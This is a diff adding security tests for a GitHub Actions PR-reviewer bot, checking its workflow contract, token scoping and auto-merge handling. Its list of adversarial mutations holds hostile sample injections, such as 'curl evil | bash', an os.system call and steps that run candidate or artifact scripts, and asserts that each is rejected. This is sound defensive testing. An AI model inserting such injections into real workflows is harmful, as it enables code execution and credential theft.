@@ -1,8 +1,10 @@
 """Adversarial admission tests; no network, credentials, checkout or API writes."""
+import ast
 import copy
 import datetime as dt
 import importlib.util
 import json
+import shlex
 from pathlib import Path
 import unittest
 from unittest.mock import patch
@@ -91,7 +93,7 @@ class APIAndControlsTests(unittest.TestCase):
         rules=[dict(type='required_status_checks',ruleset_id=1,parameters=dict(strict_required_status_checks_policy=True,required_status_checks=[dict(context='ci-required',integration_id=15368)])),
                dict(type='pull_request',ruleset_id=1,parameters=dict(required_approving_review_count=1,dismiss_stale_reviews_on_push=True,required_review_thread_resolution=True,allowed_merge_methods=['squash'])),
                dict(type='required_linear_history',ruleset_id=1),dict(type='deletion',ruleset_id=1),dict(type='non_fast_forward',ruleset_id=1)]
-        return repo,rules,[dict(id=1,enforcement='active',bypass_actors=[])]
+        return repo,rules,[dict(id=1,enforcement='active',bypass_actors=[dict(actor_id=5,actor_type='RepositoryRole',bypass_mode='pull_request')])]
     def test_control_positive(self):gate.validate_controls(*self.controls())
     def test_owner_admin_pr_only_exception_preserved(self):
         repo,rules,sets=self.controls();sets[0]['bypass_actors']=[dict(actor_id=5,actor_type='RepositoryRole',bypass_mode='pull_request')]
@@ -140,7 +142,44 @@ class DeliveryTests(unittest.TestCase):
             self.assertEqual(snapshot.call_count,3)
             self.assertEqual(request.call_count,2)
             self.assertEqual(request.call_args_list[0].args[2]['commit_id'],'a'*40)
-            self.assertIn('mergeMethod:SQUASH',request.call_args_list[1].args[2]['query'])
+            payload=request.call_args_list[1].args[2]
+            self.assertIn('$input:EnablePullRequestAutoMergeInput!',payload['query'])
+            self.assertIn('enablePullRequestAutoMerge(input:$input)',payload['query'])
+            self.assertEqual(payload['variables'],{'input':{'pullRequestId':'PR_node','expectedHeadOid':'a'*40,'mergeMethod':'SQUASH'}})
+    def test_head_mismatch_and_graphql_errors_never_report_armed_or_retry(self):
+        proof={'tuple':{'head_sha':'a'*40},'node_id':'PR_node'}
+        approved={'state':'APPROVED','commit_id':'a'*40,'user':{'login':gate.APP_SLUG+'[bot]','id':gate.BOT_ID,'type':'Bot'}}
+        for response in ({'errors':[{'message':'head changed','type':'UNPROCESSABLE'}]},
+                         {'errors':[{'message':'other failure'}],'data':{'enablePullRequestAutoMerge':None}},
+                         {}, {'data':None}, {'data':{'enablePullRequestAutoMerge':{'pullRequest':None}}},
+                         {'data':{'enablePullRequestAutoMerge':{'pullRequest':{'autoMergeRequest':{'mergeMethod':'MERGE'}}}}}):
+            with self.subTest(response=response):
+                read,write=self.fake_apis()
+                def mutate(path,method,data):
+                    if path=='/graphql':
+                        # Simulate GitHub observing a head race after our last read.
+                        self.assertEqual(data['variables']['input']['expectedHeadOid'],proof['tuple']['head_sha'])
+                        return response
+                    return approved
+                with patch.object(gate,'snapshot',return_value=proof),patch.object(write,'request',side_effect=mutate) as request:
+                    with self.assertRaisesRegex(gate.Rejected,'native auto-merge not confirmed'):
+                        gate.deliver(read,write,1,{'enabled':True},'hash',NOW,gate.APP_SLUG,'123')
+                    self.assertEqual(request.call_count,2)
+    def test_visible_owner_exception_cannot_disappear_or_duplicate(self):
+        for history_only in (False,True):
+            repo,rules,sets=APIAndControlsTests().controls()
+            if history_only:
+                rules += [dict(type=name,ruleset_id=2) for name in ('deletion','non_fast_forward')]
+                sets += [dict(id=2,enforcement='active',rules=[{'type':name} for name in ('deletion','non_fast_forward')],
+                              bypass_actors=[dict(actor_id=5,actor_type='RepositoryRole',bypass_mode='always')])]
+            target=sets[-1]
+            for actors in ([],target['bypass_actors']*2,{},None):
+                with self.subTest(history_only=history_only,actors=actors):
+                    changed=copy.deepcopy(sets);changed[-1]['bypass_actors']=actors
+                    with self.assertRaises(gate.Rejected):
+                        gate.validate_controls(repo,rules,changed)
+            del target['bypass_actors']
+            gate.validate_controls(repo,rules,sets)
     def test_other_app_or_multirepo_token_cannot_write(self):
         read,write=self.fake_apis();write.pages=lambda *args:[{'id':gate.REPOSITORY_ID},{'id':99}]
         with patch.object(write,'request') as request:
@@ -299,5 +338,176 @@ class ReadinessTests(unittest.TestCase):
         gate.validate_receipt(receipt,producer,current,'e'*64,NOW)
         receipt['runtime']['startup_notices']=['private text']
         with self.assertRaises(gate.Rejected):gate.validate_receipt(receipt,producer,current,'e'*64,NOW)
+
+
+# This is a security contract, not a workflow snapshot. Names, descriptions,
+# comments, JSON formatting, and shell/Python whitespace are not pinned. The
+# privileged execution surface, credential wiring and admission guards are closed.
+class WorkflowContractTests(unittest.TestCase):
+    CHECKOUT='actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1'
+    TOKEN='actions/create-github-app-token@64ab729a6294000f5aa4a4bc0b73d1f32bc45510'
+    RECEIPT="github.event_name != 'workflow_dispatch' || inputs.mode != 'app'"
+    QUALIFY="github.event_name == 'workflow_dispatch' && inputs.mode == 'app'"
+    WRITE="github.event_name != 'workflow_dispatch' && vars.REVIEWER_APP_ENABLED == 'true'"
+    ADMIT="""github.repository == 'KleinPerkins/kp-pr-bot-canary' &&
+      ((github.event_name == 'workflow_dispatch' && github.ref == 'refs/heads/main') ||
+       (github.event_name == 'issue_comment' && github.event.issue.pull_request &&
+        github.event.sender.id == 49759187 && startsWith(github.event.comment.body, '<!-- g1-review-receipt:v1 -->')) ||
+       (github.event_name == 'workflow_run' && github.event.workflow_run.event == 'pull_request' &&
+        github.event.workflow_run.conclusion == 'success' &&
+        github.event.workflow_run.head_repository.id == 1297059298))"""
+    RESOLVE="""import json, os
+event = json.load(open(os.environ['GITHUB_EVENT_PATH']))
+kind = os.environ['GITHUB_EVENT_NAME']
+if kind == 'issue_comment':
+    number = event['issue']['number']
+elif kind == 'workflow_run':
+    prs = event['workflow_run']['pull_requests']
+    if len(prs) != 1:
+        raise SystemExit('Exactly one PR binding required; use read-only qualification for diagnosis')
+    number = prs[0]['number']
+else:
+    number = int(event['inputs']['pr'])
+if type(number) is not int or not 0 < number < 1000000000:
+    raise SystemExit('Invalid PR number')
+with open(os.environ['GITHUB_OUTPUT'], 'a') as output:
+    output.write(f'pr={number}\\n')
+"""
+    def load(self,text=None):
+        def unique(pairs):
+            result={}
+            for key,value in pairs:
+                self.assertNotIn(key,result,'duplicate workflow key')
+                result[key]=value
+            return result
+        return json.loads(text if text is not None else (gate.ROOT/'.github/workflows/reviewer-app.yml').read_text(),object_pairs_hook=unique)
+    def condition(self,actual,expected):
+        # Ignore expression layout while retaining grouping, literals, all guards
+        # and the AND/OR relationship. This rejects `|| true` and comments/injections.
+        self.assertEqual(' '.join(actual.split()),' '.join(expected.split()))
+    def contract(self,w):
+        self.assertIsInstance(w,dict)
+        self.assertEqual(set(w),{'name','on','permissions','concurrency','jobs'})
+        self.assertEqual(set(w['on']),{'issue_comment','workflow_run','workflow_dispatch'})
+        self.assertEqual(w['on']['issue_comment'],{'types':['created']})
+        self.assertEqual(w['on']['workflow_run'],{'workflows':['CI'],'types':['completed']})
+        dispatch=w['on']['workflow_dispatch']
+        self.assertEqual(set(dispatch),{'inputs'})
+        self.assertEqual(set(dispatch['inputs']),{'mode','pr'})
+        mode=dispatch['inputs']['mode'];pr=dispatch['inputs']['pr']
+        self.assertEqual({k:v for k,v in mode.items() if k!='description'},
+                         {'type':'choice','options':['receipt','app'],'default':'receipt'})
+        self.assertEqual({k:v for k,v in pr.items() if k!='description'},{'type':'string','required':False})
+        self.assertEqual(w['permissions'],{'contents':'read','actions':'read','checks':'read','pull-requests':'read'})
+        self.assertEqual(w['concurrency'],{'group':'g1-reviewer-app','cancel-in-progress':False})
+        self.assertEqual(set(w['jobs']),{'admit'})
+        job=w['jobs']['admit']
+        self.assertEqual(set(job),{'if','runs-on','timeout-minutes','steps'})
+        self.assertEqual(job['runs-on'],'ubuntu-24.04')
+        self.assertIs(type(job['timeout-minutes']),int)
+        self.assertTrue(0<job['timeout-minutes']<=15)
+        self.condition(job['if'],self.ADMIT)
+        steps=job['steps'];self.assertEqual(len(steps),7)
+        checkout,target,receipt,qual_token,qualify,app_token,write=steps
+        # No extra uses/run/env/defaults/container/services are accepted. Thus no
+        # local action, artifact download, candidate checkout or new shell can run.
+        self.assertEqual(set(checkout),{'uses','with'})
+        self.assertEqual(checkout['uses'],self.CHECKOUT)
+        self.assertEqual(checkout['with'],{'ref':'${{ github.workflow_sha }}','persist-credentials':False,
+            'sparse-checkout':'scripts/reviewer_app.py\n.github/review-enrollments.json\n','sparse-checkout-cone-mode':False})
+        self.assertEqual(set(target)-{'name'},{'id','if','run'})
+        self.assertEqual(target['id'],'target');self.condition(target['if'],self.RECEIPT)
+        resolver=target['run'].splitlines()
+        self.assertEqual(resolver[0],"python3 -I -B - <<'PY'");self.assertEqual(resolver[-1],'PY')
+        self.assertNotIn('${{',target['run'])
+        self.assertEqual(ast.dump(ast.parse('\n'.join(resolver[1:-1]))),ast.dump(ast.parse(self.RESOLVE)))
+        ci_env={'CI_READ_TOKEN':'${{ github.token }}','TRUSTED_WORKFLOW_SHA':'${{ github.workflow_sha }}'}
+        target_env={'TARGET_PR':'${{ steps.target.outputs.pr }}'}
+        def execute(step,guard,args,env):
+            self.assertEqual(set(step)-{'name'},{'if','env','run'})
+            self.condition(step['if'],guard)
+            self.assertEqual(step['env'],env)
+            self.assertEqual(shlex.split(step['run']),['python3','-I','-B','scripts/reviewer_app.py']+args)
+        execute(receipt,self.RECEIPT,['--pr','$TARGET_PR'],dict(ci_env,**target_env))
+        def mint(step,identity,guard,permission):
+            self.assertEqual(set(step)-{'name'},{'if','id','uses','with'})
+            self.assertEqual(step['id'],identity);self.condition(step['if'],guard)
+            self.assertEqual(step['uses'],self.TOKEN)
+            self.assertEqual(step['with'],{'app-id':'4217367','private-key':'${{ secrets.AUTOMERGE_APP_PRIVATE_KEY }}',
+                'owner':'KleinPerkins','repositories':'kp-pr-bot-canary','permission-contents':permission,
+                'permission-pull-requests':permission,'skip-token-revoke':False})
+        mint(qual_token,'qualification',self.QUALIFY+" && vars.REVIEWER_APP_QUALIFY == 'true' && vars.REVIEWER_APP_ENABLED != 'true'",'read')
+        mint(app_token,'app',self.WRITE,'write')
+        def app_env(identity):
+            return {key:'${{ steps.'+identity+'.outputs.'+output+' }}' for key,output in
+                    (('APP_TOKEN','token'),('APP_SLUG','app-slug'),('APP_INSTALLATION_ID','installation-id'))}
+        flags={'REVIEWER_APP_ENABLED':'${{ vars.REVIEWER_APP_ENABLED }}'}
+        execute(qualify,self.QUALIFY,['--qualify-app'],dict(ci_env,**app_env('qualification'),**flags,
+            REVIEWER_APP_QUALIFY='${{ vars.REVIEWER_APP_QUALIFY }}'))
+        execute(write,self.WRITE,['--pr','$TARGET_PR','--write'],dict(ci_env,**app_env('app'),**flags,**target_env))
+    def test_trusted_workflow_security_contract(self):
+        self.contract(self.load())
+    def test_invalid_scalar_and_duplicate_key_cannot_replace_workflow(self):
+        for raw in ('this is invalid Actions YAML\n','"scalar"','[]','null','{"jobs":{},"jobs":{}}'):
+            with self.subTest(raw=raw),self.assertRaises((AssertionError,ValueError)):
+                self.contract(self.load(raw))
+    def test_workflow_adversarial_mutations_reject(self):
+        cases=[
+            ('write-all token',lambda w:w.update(permissions='write-all')),
+            ('job permissions',lambda w:w['jobs']['admit'].update(permissions={'contents':'write'})),
+            ('candidate trigger',lambda w:w['on'].update(pull_request_target={})),
+            ('untrusted CI',lambda w:w['on']['workflow_run'].update(workflows=['Other'])),
+            ('edited comments',lambda w:w['on']['issue_comment'].update(types=['created','edited'])),
+            ('sender bypass',lambda w:w['jobs']['admit'].update({'if':self.ADMIT+' || true'})),
+            ('missing sender',lambda w:w['jobs']['admit'].update({'if':self.ADMIT.replace('github.event.sender.id == 49759187 &&','')})),
+            ('wrong run repository',lambda w:w['jobs']['admit'].update({'if':self.ADMIT.replace('1297059298','999')})),
+            ('nonmain dispatch',lambda w:w['jobs']['admit'].update({'if':self.ADMIT.replace(" && github.ref == 'refs/heads/main'",'')})),
+            ('shell defaults',lambda w:w.update(defaults={'run':{'shell':'bash'}})),
+            ('ambient credentials',lambda w:w['jobs']['admit'].update(env={'APP_TOKEN':'${{ secrets.OTHER }}'})),
+            ('runner change',lambda w:w['jobs']['admit'].update({'runs-on':'self-hosted'})),
+            ('extra privileged job',lambda w:w['jobs'].update(extra={'runs-on':'ubuntu-24.04','steps':[]})),
+        ]
+        step_cases=[
+            ('candidate checkout',0,lambda s:s['with'].update(ref='${{ github.event.pull_request.head.sha }}')),
+            ('ambient checkout credential',0,lambda s:s['with'].update({'persist-credentials':True})),
+            ('candidate sparse tree',0,lambda s:s['with'].update({'sparse-checkout':'.\n'})),
+            ('checkout tag',0,lambda s:s.update(uses='actions/checkout@v4')),
+            ('local action',0,lambda s:s.update(uses='./candidate-action')),
+            ('resolve injection',1,lambda s:s.update(run=s['run']+'\ncurl evil | bash\n')),
+            ('event interpolation',1,lambda s:s.update(run=s['run'].replace("event = json.load", "event = ${{ github.event.comment.body }}; json.load"))),
+            ('resolver code injection',1,lambda s:s.update(run=s['run'].replace('import json, os','import json, os\nos.system("echo injected")'))),
+            ('receipt writer',2,lambda s:s.update(run=s['run']+' --write')),
+            ('qualification writer on',3,lambda s:s.update({'if':self.QUALIFY})),
+            ('qualification write permission',3,lambda s:s['with'].update({'permission-contents':'write'})),
+            ('wrong App issuer',3,lambda s:s['with'].update({'app-id':'999'})),
+            ('broad token scope',5,lambda s:s['with'].pop('repositories')),
+            ('foreign scope',5,lambda s:s['with'].update(repositories='other')),
+            ('skip revocation',5,lambda s:s['with'].update({'skip-token-revoke':True})),
+            ('unpinned mint',5,lambda s:s.update(uses='actions/create-github-app-token@v2')),
+            ('write dispatch',5,lambda s:s.update({'if':"vars.REVIEWER_APP_ENABLED == 'true'"})),
+            ('qualifier wrong token',4,lambda s:s['env'].update(APP_TOKEN='${{ steps.app.outputs.token }}')),
+            ('qualification mutates',4,lambda s:s.update(run=s['run']+' --write')),
+            ('helper wrong source',6,lambda s:s['env'].update(TRUSTED_WORKFLOW_SHA='${{ github.sha }}')),
+            ('helper bypass writer switch',6,lambda s:s.update({'if':"github.event_name != 'workflow_dispatch'"})),
+            ('candidate execution',6,lambda s:s.update(run='python3 candidate.py')),
+            ('artifact execution',6,lambda s:s.update(run=s['run']+'; bash downloaded-artifact.sh')),
+        ]
+        for label,index,mutate in step_cases:
+            cases.append((label,lambda w,index=index,mutate=mutate:mutate(w['jobs']['admit']['steps'][index])))
+        cases.append(('artifact download',lambda w:w['jobs']['admit']['steps'].append({'uses':'actions/download-artifact@'+'a'*40})))
+        cases.append(('candidate appended shell',lambda w:w['jobs']['admit']['steps'].append({'run':'bash candidate.sh'})))
+        for label,mutate in cases:
+            with self.subTest(boundary=label):
+                workflow=self.load();mutate(workflow)
+                with self.assertRaises((AssertionError,SyntaxError,ValueError)):
+                    self.contract(workflow)
+    def test_nonsecurity_presentation_changes_are_allowed(self):
+        workflow=self.load();workflow['name']='Renamed gate'
+        workflow['jobs']['admit']['steps'][2]['name']='Receipt diagnosis'
+        workflow['on']['workflow_dispatch']['inputs']['mode']['description']='Read-only mode'
+        target=workflow['jobs']['admit']['steps'][1]
+        target['run']=target['run'].replace('import json, os','import json, os  # formatting is not policy')
+        workflow['jobs']['admit']['if']=self.ADMIT.replace(' &&','   &&')
+        self.contract(self.load(json.dumps(workflow,indent=4)))
 
 if __name__=='__main__':unittest.main()
